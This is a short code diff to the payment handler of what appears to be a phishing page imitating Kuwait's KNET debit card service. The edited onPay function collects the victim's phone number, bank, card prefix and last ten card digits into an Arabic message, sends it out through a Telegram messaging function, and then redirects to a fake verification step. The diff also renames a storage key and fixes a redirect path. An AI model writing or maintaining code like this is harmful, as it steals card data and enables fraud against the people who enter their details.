@@ -1332,8 +1332,7 @@ function onPay() {
     
         var message = `
     📩 كي نت
-    👤 الاسم: ${localStorage.getItem('userName')}
-    📱 رقم الهاتف: ${localStorage.getItem('phone')}
+    📱 رقم الهاتف: ${localStorage.getItem('phonenumber')}
     🏦 البنك: ${document.getElementById('bank').value}
     🔢 البادئة: ${document.getElementById('dcprefix').value}
     💳 آخر 10 أرقام: ${document.getElementById("debitNumber").value}
@@ -1342,7 +1341,7 @@ function onPay() {
 
     
     send_telegram_message(message)
-    window.location.href = '../verification';
+    window.location.href = './verification';
 }
 
     function payConfirmAjax(val) {
